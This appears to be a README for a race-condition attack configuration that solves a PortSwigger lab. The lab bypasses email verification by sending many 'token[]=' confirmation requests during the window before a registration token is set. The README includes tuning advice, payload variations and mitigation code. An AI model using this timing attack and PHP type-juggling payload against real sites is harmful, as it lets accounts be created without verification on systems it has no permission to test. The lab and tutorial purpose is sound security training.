# PortSwigger Partial Construction Race - TRECO Attack

## 🎯 Overview

This attack exploits a **partial construction race condition** in user registration systems where email verification tokens are set asynchronously after account creation.

**Vulnerability:** CWE-362 (Race Condition)  
**Difficulty:** Expert  
**Lab:** [PortSwigger - Partial Construction Race Condition](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

---

## 🔍 Vulnerability Explanation

### The Race Window

```
T=0ms     Registration POST /register starts
          ↓
T=5ms     User INSERT (token=NULL) ⚡ RACE WINDOW OPENS
          ↓
T=10ms    Confirmation requests: SELECT user WHERE token=NULL
          → []== NULL evaluates to TRUE (PHP type juggling)
          → Account confirmed! ✓
          ↓
T=150ms   Token generated and UPDATE user SET token='abc123'
          ↓
T=500ms   Registration response returned
```

**Key Insight:** Between user creation (INSERT) and token assignment (UPDATE), there's a 5-200ms window where `token=NULL`. Confirmation requests with empty array (`token[]=`) exploit PHP's type juggling to match NULL.

---

## 💡 Attack Strategy

### Thread Groups Approach

```yaml
thread_groups:
  # Group 1: Creates user with token=NULL
  - name: registration
    threads: 1
    delay_ms: 0
    
  # Group 2: Exploits race window
  - name: confirmations
    threads: 20
    delay_ms: 50  # Tuned to hit race window
```

**Why This Works:**

1. **Barrier Synchronization:** All 21 threads start simultaneously
2. **Registration (0ms delay):** Creates user immediately
3. **Confirmations (50ms delay):** Delayed to hit the race window
4. **No Session Cookie:** Avoids PHP session locking (critical!)

---

## 🚀 Usage

### Prerequisites

- TRECO installed and configured
- PortSwigger Web Security Academy account
- Active Partial Construction lab instance

### Quick Start

1. **Start the lab:**
   ```
   https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction
   ```

2. **Get lab URL:**
   ```
   Example: 0a1b2c3d4e5f.web-security-academy.net
   ```

3. **Set environment variable:**
   ```bash
   export LAB_HOST="0a1b2c3d4e5f.web-security-academy.net"
   ```

4. **Run attack:**
   ```bash
   treco attack.yaml
   ```

### With Burp Suite Proxy

Uncomment proxy configuration in `attack.yaml`:

```yaml
target:
  proxy:
    type: http
    host: 127.0.0.1
    port: 8080
```

Run attack:
```bash
treco attack.yaml
```

---

## 📊 Expected Output

### Successful Attack

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  🦎 TRECO - Partial Construction Race Attack                                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  🎯 Target:   0a1b2c3d4e5f.web-security-academy.net                          ║
║  👤 Username: attacker-a3f5c891                                              ║
║  📧 Email:    attacker@ginandjuice.shop                                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

   Group 1: registration   (1 thread,  0ms delay)
   Group 2: confirmations (20 threads, 50ms delay)

⏳ Starting race attack...

✅ Create user account: Success (HTTP 200) - 523.4567 ms
🎉 Confirm without token: CONFIRMED! Account created without email verification!
  👤 Username: attacker-a3f5c891
  📧 Email: attacker@ginandjuice.shop
  🔑 Password: hacked123
🎉 Confirm without token: CONFIRMED! Account created without email verification!
🎉 Confirm without token: CONFIRMED! Account created without email verification!
...

✅ Race attack completed!

📊 Results Summary:
   ✓ Successful requests: 8/21

🎉 VULNERABLE! Multiple confirmations succeeded - partial construction exploited!

──────────────────────────────────────────────────────────────────────────────
🏁 Attack sequence complete
──────────────────────────────────────────────────────────────────────────────
```

### Success Metrics

- **Expected Success Rate:** 30-50% (6-10 confirmations out of 20)
- **Timing:** Registration ~500ms, Confirmations ~20-100ms
- **Indicator:** Multiple "CONFIRMED!" messages

---

## 🔧 Configuration

### Key Parameters

```yaml
thread_groups:
  - name: registration
    threads: 1        # Single registration request
    delay_ms: 0       # Execute immediately after barrier
    
  - name: confirmations
    threads: 20       # Number of confirmation attempts
    delay_ms: 50      # Delay to hit race window (tune this!)
```

### Tuning the Attack

#### Increase Success Rate

```yaml
- name: confirmations
  threads: 50      # More threads = more chances
  delay_ms: 30     # Earlier timing
```

#### Cover Wider Race Window

Use staggered delays:

```yaml
thread_groups:
  - name: registration
    threads: 1
    delay_ms: 0
  
  - name: early_confirmations
    threads: 10
    delay_ms: 20
  
  - name: mid_confirmations
    threads: 10
    delay_ms: 50
  
  - name: late_confirmations
    threads: 10
    delay_ms: 80
```

#### Try Different Token Variations

```yaml
thread_groups:
  - name: empty_array
    threads: 10
    request: |
      POST /confirm?token[]= HTTP/1.1
      ...
  
  - name: nested_array
    threads: 5
    request: |
      POST /confirm?token[][]= HTTP/1.1
      ...
  
  - name: keyed_array
    threads: 5
    request: |
      POST /confirm?token[key]= HTTP/1.1
      ...
```

---

## 🐛 Troubleshooting

### Issue: Only 1 Request Succeeds

**Symptom:**
```
✓ Successful requests: 1/21
⚠️  Only 1 request(s) succeeded - may not be vulnerable
```

**Causes:**
1. **Session locking** - Confirmations are waiting for registration to complete
2. **Delay too high** - Missing the race window
3. **Network latency** - Requests arriving too late

**Solutions:**

✅ **Verify no session cookie in confirmations:**
```yaml
- name: confirmations
  request: |
    POST /confirm?token[]= HTTP/1.1
    Host: {{ target.host }}
    # NO Cookie header! ← Important
    Content-Length: 0
```

✅ **Reduce delay:**
```yaml
- name: confirmations
  delay_ms: 20  # Try 20ms instead of 50ms
```

✅ **Use multiplexed connection:**
```yaml
race:
  connection_strategy: multiplexed  # HTTP/2 for lower latency
```

---

### Issue: All Confirmations Get HTTP 400

**Symptom:**
```
❌ Confirm without token failed (HTTP 400) - 523.45 ms
❌ Confirm without token failed (HTTP 400) - 524.12 ms
...
```

**Cause:** PHP session locking - all confirmations wait for registration lock

**Solution:**
```yaml
# Confirmations must NOT include session cookie
- name: confirmations
  request: |
    POST /confirm?token[]= HTTP/1.1
    Host: {{ target.host }}
    # Remove this line: Cookie: phpsessionid={{ session }}
    Content-Length: 0
```

---

### Issue: Connection Errors

**Symptom:**
```
ERROR: Connection refused / Timeout
```

**Solutions:**

✅ **Check lab is active:**
```bash
curl -I https://$LAB_HOST/
```

✅ **Verify LAB_HOST:**
```bash
echo $LAB_HOST
# Should output: 0a1b2c3d4e5f.web-security-academy.net
```

✅ **Check TLS configuration:**
```yaml
target:
  tls:
    enabled: true
    verify_cert: false  # Lab uses self-signed cert
```

---

### Issue: Race Window Timing

**Symptom:** Success rate < 20%

**Solution:** Experiment with delays

```bash
# Try different delays
for delay in 20 30 40 50 60 70 80; do
  echo "Testing delay: ${delay}ms"
  # Modify attack.yaml delay_ms value
  treco attack.yaml
done
```

Optimal delay is usually **30-80ms** depending on network latency.

---

## 📚 Technical Deep Dive

### PHP Type Juggling Exploit

```php
// Server-side code (vulnerable)
$token = $_GET['token'];
$user = db->query("SELECT * FROM users WHERE token = ?", [$token]);

if ($user && $user->token == $token) {  // ← Weak comparison
    confirm_user($user);
}
```

**Attack:**
```http
POST /confirm?token[]= HTTP/1.1
```

**Evaluation:**
```php
$token = [];              // Empty array
$user->token = NULL;      // Database NULL

[]== NULL → TRUE ✓       // PHP type juggling
```

### Race Window Analysis

```
┌─────────────────────────────────────────────────────────────┐
│ Server Timeline                                             │
└─────────────────────────────────────────────────────────────┘

T=0ms     POST /register received
          ↓
T=5ms     INSERT INTO users (username, email, token) 
          VALUES ('attacker', 'email', NULL)
          ↓
          ⚡ RACE WINDOW: 5-150ms ⚡
          ↓
          Multiple POST /confirm?token[]= received
          → SELECT * FROM users WHERE token = []
          → []== NULL → TRUE
          → UPDATE users SET confirmed=1
          ↓
T=150ms   Generate token: $token = bin2hex(random_bytes(16))
          UPDATE users SET token = 'abc123...' WHERE id = 1
          ↓
T=500ms   POST /register returns HTTP 200
```

**Critical Timing:**
- Registration INSERT: ~5ms
- Token generation: ~100-150ms
- **Optimal confirmation delay: 30-80ms**

---

## 🎓 Learning Objectives

After running this attack, you'll understand:

1. **Thread Groups** - Clean syntax for multi-group race attacks
2. **Barrier Synchronization** - All threads start simultaneously
3. **Per-Group Delays** - Fine-tuned timing for race windows
4. **PHP Type Juggling** - Weak comparison vulnerabilities
5. **Session Locking** - Why avoiding sessions is critical
6. **Multiplexed Connections** - HTTP/2 for lower latency
7. **Race Window Timing** - Finding and exploiting async operations

---

## 🔐 Mitigation

### For Developers

❌ **Vulnerable Code:**
```php
// User created with NULL token
$db->insert('users', ['username' => $user, 'token' => null]);

// Token set later (race window!)
$token = generateToken();
$db->update('users', ['token' => $token], ['username' => $user]);

// Weak comparison
if ($user->token == $provided_token) {  // []== null → true
    confirm($user);
}
```

✅ **Fixed Code:**
```php
// Generate token BEFORE insertion
$token = generateToken();
$db->insert('users', ['username' => $user, 'token' => $token]);

// Use strict comparison
if ($user->token === $provided_token) {  // []!== null → false
    confirm($user);
}

// Or use database transaction
$db->transaction(function() use ($user, $token) {
    $db->insert('users', ['username' => $user, 'token' => null]);
    $db->update('users', ['token' => $token], ['username' => $user]);
});
```

---

## 📖 References

- **PortSwigger Lab:** https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction
- **Race Conditions Guide:** https://portswigger.net/web-security/race-conditions
- **PHP Type Juggling:** https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
- **TRECO Thread Groups:** [THREAD_GROUPS.md](../THREAD_GROUPS.md)

---

## 📝 Notes

### Why Thread Groups?

**Before (Traditional Mode):**
```yaml
input:
  endpoint:
    - "/register"
    - "/confirm?token[]="
    - "/confirm?token[]="
    # ... repeat 20x ❌
```

**After (Thread Groups):**
```yaml
thread_groups:
  - name: registration
    threads: 1
    request: POST /register
  
  - name: confirmations
    threads: 20
    request: POST /confirm?token[]=
```

**Benefits:**
- ✅ 90% less code
- ✅ Clear grouping
- ✅ Easy to tune
- ✅ Per-group delays

### Session Locking Explained

PHP processes **one request per session** at a time:

```
With Session Cookie (❌ Sequential):
T=0ms    Thread 0: POST /register (LOCKS session)
T=0ms    Threads 1-20: POST /confirm (WAIT for lock)
T=500ms  Thread 0: Completes (UNLOCKS)
T=501ms  Threads 1-20: Execute (too late, token filled)

Without Session Cookie (✅ Parallel):
T=0ms    All threads execute simultaneously
T=5ms    Registration: INSERT user (token=NULL)
T=50ms   Confirmations: SELECT + match NULL ✓
```

---

## 🏆 Challenge

Can you modify this attack to:

1. **Test multiple delay values** automatically
2. **Find the optimal delay** for your network
3. **Exploit with different parameter variations** (token[][], token[key]=)
4. **Achieve >80% success rate** (16+ confirmations)

Share your improvements! 🚀

---

## 📄 License

This attack configuration is provided for educational purposes only. Use only on systems you own or have explicit permission to test.

---

**Happy Hunting!** 🦎